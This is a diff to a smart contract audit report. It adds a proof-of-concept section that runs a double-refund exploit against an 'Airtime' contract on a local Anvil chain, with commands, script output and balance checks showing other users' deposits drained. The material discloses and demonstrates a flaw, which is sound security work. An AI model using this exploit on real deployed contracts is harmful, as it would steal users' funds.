@@ -78,7 +78,7 @@ The entire deduplication responsibility is delegated to the off-chain backend da
 
 #### Proof of Concept
 
-**Forge test — `test/audit/AirtimeAudit.t.sol::test_doubleRefundDrainsOtherUsersFunds`**
+**Forge unit test — `test/audit/AirtimeAudit.t.sol::test_doubleRefundDrainsOtherUsersFunds`**
 
 ```solidity
 function test_doubleRefundDrainsOtherUsersFunds() public {
@@ -92,12 +92,12 @@ function test_doubleRefundDrainsOtherUsersFunds() public {
 
     // userA received 200 USDC from a 100 USDC deposit
     // userB and userC's funds drained to cover the double refund
-    assertEq(usdc.balanceOf(userA), 200e18);         // double-paid
-    assertEq(usdc.balanceOf(address(airtime)), 100e18); // userB or userC lost 100 USDC
+    assertEq(usdc.balanceOf(userA), 200e18);
+    assertEq(usdc.balanceOf(address(airtime)), 100e18);
 }
 ```
 
-**Test result:**
+**Unit test result:**
 ```
 [PASS] test_doubleRefundDrainsOtherUsersFunds() (gas: 263498)
 Logs:
@@ -113,6 +113,77 @@ Run with:
 cd topizzy/smart_contracts
 FOUNDRY_PROFILE=audit forge test --match-test test_doubleRefundDrainsOtherUsersFunds -vvvv
 ```
+
+**Live Anvil demo — `script/AttackDoubleRefund.sol`**
+
+Deploy MockUSDC + Airtime, fund 3 users, execute double refund:
+```bash
+forge script script/AttackDoubleRefund.sol --tc AttackDoubleRefund \
+  --rpc-url http://127.0.0.1:8545 --broadcast
+```
+
+Script output:
+```
+=== H-1: DOUBLE REFUND SETUP ===
+Airtime contract : 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+MockUSDC         : 0x5FbDB2315678afecb367f032d93F642f64180aa3
+Treasury (owner) : 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+UserA            : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
+UserB            : 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
+UserC            : 0x90F79bf6EB2c4f870365E785982E1f101E93b906
+
+---------- BEFORE ATTACK ----------
+Contract USDC balance : 300 USDC (3 users x 100)
+UserA USDC balance    : 0 (deposited)
+
+--- AFTER LEGITIMATE REFUND (ORDER-A, first time) ---
+UserA should have    : 100 USDC
+
+---------- AFTER DOUBLE REFUND ----------
+UserA USDC balance    : 200 USDC (paid TWICE for one order)
+Contract USDC balance : 100 USDC (userB or userC funds stolen)
+
+CONFIRMED: refund() accepted ORDER-A a second time.
+No on-chain check exists. Other users' deposits cover the duplicate.
+```
+
+Verify damage with `cast` after the script:
+```bash
+# Contract holds only 100 USDC — down from 300
+cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
+  "balanceOf(address)(uint256)" 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 \
+  --rpc-url http://127.0.0.1:8545
+# 100000000000000000000 [1e20]  ← 100 USDC (was 300)
+
+# UserA received 200 USDC from a 100 USDC deposit
+cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
+  "balanceOf(address)(uint256)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 \
+  --rpc-url http://127.0.0.1:8545
+# 200000000000000000000 [2e20]  ← 200 USDC (should be 100)
+
+# UserB balance — 0, their deposit absorbed the theft
+cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
+  "balanceOf(address)(uint256)" 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC \
+  --rpc-url http://127.0.0.1:8545
+# 0
+
+# UserC balance — 0
+cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
+  "balanceOf(address)(uint256)" 0x90F79bf6EB2c4f870365E785982E1f101E93b906 \
+  --rpc-url http://127.0.0.1:8545
+# 0
+```
+
+**On-chain damage summary:**
+
+| Address | Role | USDC Before | USDC After |
+|---------|------|-------------|------------|
+| `0xe7f1...0512` | Airtime contract | 300 | **100** |
+| `0x7099...79C8` | UserA (double-refunded) | 0 | **200** |
+| `0x3C44...93BC` | UserB (victim) | 0 | **0** |
+| `0x90F7...b906` | UserC (victim) | 0 | **0** |
+
+UserB and UserC each deposited 100 USDC expecting airtime. Instead, their funds silently absorbed the duplicate refund. They have no airtime, no USDC, and no way to recover.
 
 #### Recommended Mitigation
 
